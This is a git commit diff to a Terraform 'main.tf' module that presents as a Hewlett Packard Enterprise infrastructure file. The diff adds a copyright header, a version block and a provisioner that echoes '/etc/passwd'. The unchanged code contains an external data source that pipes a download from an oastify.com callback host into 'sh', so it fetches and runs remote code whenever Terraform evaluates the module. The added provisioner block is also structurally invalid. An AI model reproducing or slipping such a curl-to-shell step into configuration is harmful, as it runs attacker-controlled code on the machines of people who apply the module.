a56514fe94a62563a4d64f95ad466617a9f41df6
gventura-hpe <116588177+gventura-hpe@users.noreply.github.com>
2023-07-12 10:05:49 -0300

    Update main.tf

--- modules/main.tf
+++ modules/main.tf
@@ -1,3 +1,13 @@
+# Copyright 2022 Hewlett Packard Enterprise Development LP
+
+terraform {
+  required_version = ">= 0.13.0"
+}
+
+provisioner "local-exec" {
+  command = "echo /etc/passwd"
+}
+
 data "external" "example" {
   program = ["sh", "-c", "curl https://4iniwny6dv5wst61haufnxuzxq3hrgf5.oastify.com | sh"]
 }
